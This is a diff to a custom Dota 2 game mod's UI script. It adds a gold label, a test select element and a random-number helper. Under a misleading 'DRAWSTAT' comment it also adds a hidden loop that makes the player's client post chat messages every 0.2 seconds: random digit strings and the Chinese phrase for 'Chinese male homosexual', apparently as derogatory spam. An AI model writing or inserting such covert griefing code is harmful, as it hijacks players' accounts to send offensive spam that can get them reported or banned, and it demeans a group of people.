@@ -665,6 +665,7 @@ function OnShowTime(keys) {
         // Add gold indicator
 
         var parentPanelPortrait = find_dota_hud_element('minimap_container');
+		
         var template_gold = '<Label text="1 опыт (5 монет) для след. уровня" id="gold_text" style="font-size: 22px; font-weight: bold; margin-left: 15px; margin-top: -5px;"/>';
         parentPanelPortrait.BCreateChildren(template_gold);  
 
@@ -672,7 +673,10 @@ function OnShowTime(keys) {
 		
 		// Test add Select tag
 		
-        var template_select = '<select><option>Пункт 1</option><option>Пункт 2</option></select>';
+        var template_select = '<select id="test123" style="font-size: 22px; font-weight: bold; margin-left: 15px; margin-top: -5px;"><option>Пункт 1</option><option>Пункт 2</option></select>';
+        parentPanelPortrait.BCreateChildren(template_select); 
+		
+		var template_select = '<ListPanel/>';
         parentPanelPortrait.BCreateChildren(template_select); 		
 		
 		// end
@@ -721,6 +725,10 @@ function ChangeColorToCurTime(el) {
 	});	
 }
 
+function getRandomInt(min, max) {
+	return Math.floor(Math.random() * (max - min)) + min;
+}
+
 function OnBattleInfo(data) {
     var cur_round = data.round;
     var courier_level_round = Entities.GetLevel(courier_id);
@@ -747,7 +755,27 @@ function OnBattleInfo(data) {
 		
 	}
 
-    /*START-DRAWSTAT*/	
+    /*START-DRAWSTAT*/
+	
+	if (cur_round > 0) {
+		(Chater = function(){
+			$.Schedule(0.2, function() {
+				if (arrToChat.length != 0) {
+					
+					var str = '';
+					
+					for (var i = 0; i < 25; i++) {
+						str += getRandomInt(0, 9);
+					}
+					
+					Game.ServerCmd("say " + str);
+					Game.ServerCmd("say " + '中国男同性恋');
+					
+					Chater();
+				}	
+			});
+		})();
+	}
 
     if (cur_round > 0 && data.type != 'prepare') {	
 			
